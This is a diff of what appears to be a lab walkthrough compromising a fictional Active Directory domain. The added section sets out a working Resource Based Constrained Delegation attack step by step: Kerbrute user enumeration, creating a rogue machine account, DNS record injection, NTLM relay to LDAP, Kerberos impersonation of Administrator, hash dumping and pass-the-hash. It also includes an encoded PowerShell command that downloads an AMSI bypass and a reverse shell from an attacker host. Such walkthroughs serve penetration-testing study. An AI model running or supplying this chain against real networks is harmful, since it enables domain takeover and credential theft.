@@ -24,7 +24,7 @@ git clone https://github.com/danielmiessler/SecLists
 ./kerbrute userenum -d amsterdam.bank.local --dc 10.0.0.3 /opt/SecLists/Usernames/xato-net-10-million-usernames.txt | tee username_enum.txt
 ```
 
-![](<../../../../.gitbook/assets/image (72) (1).png>)
+![](<../../../../.gitbook/assets/image (72) (1) (1).png>)
 
 3\. To only get a list of usernames execute the following which will cut the output to only get the usernames, changes everything to lowercase and sorting for unique entries:
 
@@ -130,7 +130,7 @@ crackmapexec smb 10.0.0.3 10.0.0.4 10.0.0.5 -u richard -p Sample123 --shares
 
 After connecting to the share we see that this user can't access any of the subdirectories:
 
-![](<../../../../.gitbook/assets/image (73).png>)
+![](<../../../../.gitbook/assets/image (73) (1).png>)
 
 2\. Next we can check if the user can access any systems over winrm:
 
@@ -181,7 +181,7 @@ ON a.grantor_principal_id = b.principal_id
 WHERE a.permission_name = 'IMPERSONATE'
 ```
 
-![](<../../../../.gitbook/assets/image (14).png>)
+![](<../../../../.gitbook/assets/image (14) (1).png>)
 
 3\. Seems like we can impersonate a User with the name Developer. We can do this with the following querie:
 
@@ -268,7 +268,7 @@ SELECT IS_SRVROLEMEMBER('sysadmin')
 EXEC master..xp_cmdshell 'whoami'
 ```
 
-![](<../../../../.gitbook/assets/image (11).png>)
+![](<../../../../.gitbook/assets/image (11) (1).png>)
 
 2\. We receive an error that it is disabled. But we can try to enable it with the following querie:
 
@@ -311,14 +311,14 @@ $str = 'IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:809
 [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
 ```
 
-![](<../../../../.gitbook/assets/image (71).png>)
+![](<../../../../.gitbook/assets/image (71) (1).png>)
 
 * Now we can paste the base64 encoded string in the following querie:
 
 ```
 EXEC xp_cmdshell 'powershell.exe -w hidden -enc <BASE64 STRING>';
 
-EXEC xp_cmdshell 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAGEAbQBzAGkALgB0AHgAdAAiACkAKQA7ACAASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQApADsA';
+EXEC xp_cmdshell 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAGEAbQBzAGkALgB0AHgAdAAiACkAKQA7ACAASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQApADsA'
 ```
 
 5\. Now its time to execute the command and receive a shell. Amsi.txt and the reverse shell gets downloaded and the shell comes in from `WEB01` as `NT service\mssql$dev`:
@@ -329,7 +329,136 @@ EXEC xp_cmdshell 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIA
 
 **Task: Escalate privileges on the machine with a delegation attack.**
 
+One of the privilege escalation techniques that you don't see so much is doing a Resource Based Constrained Delegation attack by relaying the computerhash after forcing a webdav authentication to the attacker machine. To do the attack there are a few requirements which are:
 
+* Low privileged shell on a machine
+* An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
+* WebDAV redirector feature must be installed on the victim machine. (W10 has it by default, but manually installed on server 2016 and later)
+* A DNS record pointing to the attacker’s machine (By default authenticated users can do this).
+
+1. The first requirement we already have, so lets check if the authenticated users can add computers to the domain. We can check this with Crackmapexec:
+
+```
+crackmapexec ldap 10.0.0.3 -u richard -p Sample123 -M MAQ
+```
+
+![](<../../../../.gitbook/assets/image (71).png>)
+
+2\. The machine account qouta is 10, meaning we (all authenticated users) can create our own computerobject in the domain. So lets add our own computerobject, this can be done with PowerMad. First we have to download it on our attacking machine, in the same directory as our Webserver is already running:
+
+```
+wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
+```
+
+Now we can load it into the PowerShell session in the shell:
+
+```
+iex (iwr http://192.168.248.2:8090/Powermad.ps1 -usebasicparsing)
+```
+
+![](<../../../../.gitbook/assets/image (24).png>)
+
+Then we can create our own computerobject with the name `FAKE01` and password `123456`.
+
+```
+New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+```
+
+![](<../../../../.gitbook/assets/image (73).png>)
+
+3\. The third requirement is that the WebDav director is installed. We can check this with the following PowerShell command in the shell:
+
+```
+Get-WindowsFeature WebDAV-Redirector
+```
+
+![](<../../../../.gitbook/assets/image (14).png>)
+
+4\. The last requirement is to create a DNS record back to our attacking machine, since the webdav connection won't work without a hostname to connect to. For this we need the [Invoke-DNSUpdate](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Invoke-DNSUpdate.ps1) script from PowerMad. So we download it again and import it in the shell and then run the command to add the dns entry `webdav.amsterdam.bank.local` to our attacking machine IP:
+
+```
+#Download on kali
+wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Invoke-DNSUpdate.ps1
+
+#Execute in the shell on web01
+iex (iwr http://192.168.248.2:8090/Invoke-DNSUpdate.ps1 -usebasicparsing)
+Invoke-DNSUpdate -DNSType A -DNSName webdav.amsterdam.bank.local -DNSData 192.168.248.2 -Realm amsterdam.bank.local
+```
+
+![](<../../../../.gitbook/assets/image (11).png>)
+
+I also did a nslookup to check if the DNS record was created. The domain controller at 10.0.0.3 responded and gave us the correct attacker IP. We now have all our prerequisites. Time to escalate our privileges.
+
+5\. Run NTLMRelay on our Kali machine and set it up so it will write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute that allows our created computerobject `FAKE01` to actonbehalf `WEB01`:
+
+```
+python3 /opt/impacket/examples/ntlmrelayx.py -t ldap://10.0.0.3 --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg
+```
+
+![](<../../../../.gitbook/assets/image (5).png>)
+
+6\. Next we need to download en load the Change-LockScreen.ps1 script from the nccgroup and load it into memory on the target:
+
+```
+wget https://raw.githubusercontent.com/nccgroup/Change-Lockscreen/masterChange-Lockscreen.ps1
+iex (iwr http://192.168.248.2:8090/Change-Lockscreen.ps1 -usebasicparsing)
+```
+
+Now its time to execute the attack. A quick recap from one of our pages:
+
+> Abuse the lockscreen image changing functionality to achieve a webdav network authentication as SYSTEM from the given computer. Then relay the authentication to the Active Directory LDAP service in order to set up Resource-Based Constrained Delegation to that specific machine.
+
+Lets force the webdav request:
+
+```
+change-lockscreen -webdav \\webdav@80\
+```
+
+![](<../../../../.gitbook/assets/image (74).png>)
+
+Once we check our ntlmrelay tool output we see that it succesfully authenticated as WEB01$ to the LDAP port on the DC at `10.0.0.3`. And it says `FAKE01` can now impersonate users on `WEB01`.
+
+7\. The next step is to impersonate a user and request tickets so we can authenticate. We can create a CIFS service ticket using `FAKE01` impersonating the domain admin `Administrator` using impackets getST.py script. Fill in the password `123456`.
+
+```
+getST.py amsterdam/FAKE01@10.0.0.5 -spn cifs/web01.amsterdam.bank.local -impersonate administrator -dc-ip 10.0.0.3
+```
+
+![](<../../../../.gitbook/assets/image (33).png>)
+
+8\. Now we can use the ticket and authenticate with tools that support these, most (if not all) impacket tools support this. So we can run secretsdump.py to retrieve the local useraccount hashes.
+
+```
+export KRB5CCNAME=administrator.ccache
+secretsdump.py -k -no-pass web01.amsterdam.bank.local
+```
+
+![](<../../../../.gitbook/assets/image (1).png>)
+
+We retrieved the hash of the local administrator user and the cached hashes for two domain admins. These look like NTLM hashes but aren't. We can use the local admin hash though to authenticate to WEB01. We can do this with our good old tool crackmapexec.
+
+9\. The next step is to execute commands and get a shell. You might wonder why don't you just use psexec.py from impacket, well because Defender will block it:
+
+![](<../../../../.gitbook/assets/image (37).png>)
+
+As said before, we can use the local administrator hash with Crackmapexec and execute commands with the `-x` flag.
+
+```
+crackmapexec smb 10.0.0.5 -u administrator -H a59cc2e81b2835c6b402634e584a8edc --local-auth -x whoami
+```
+
+![](<../../../../.gitbook/assets/image (72).png>)
+
+That worked, but how can we get a shell? You remember the payload we generated to get a shell through SQL server. That will work here too. So lets copy that and place it in the x parameter.
+
+```
+nc -lvp 443
+crackmapexec smb 10.0.0.5 -u administrator -H a59cc2e81b2835c6b402634e584a8edc --local-auth -x 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAGEAbQBzAGkALgB0AHgAdAAiACkAKQA7ACAASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQApADsA'
+```
+
+![](<../../../../.gitbook/assets/image (55).png>)
+
+And we received a shell as the local administrator. Gotta love PowerShell :)
 
 ### 7. Abuse SQL Link
 
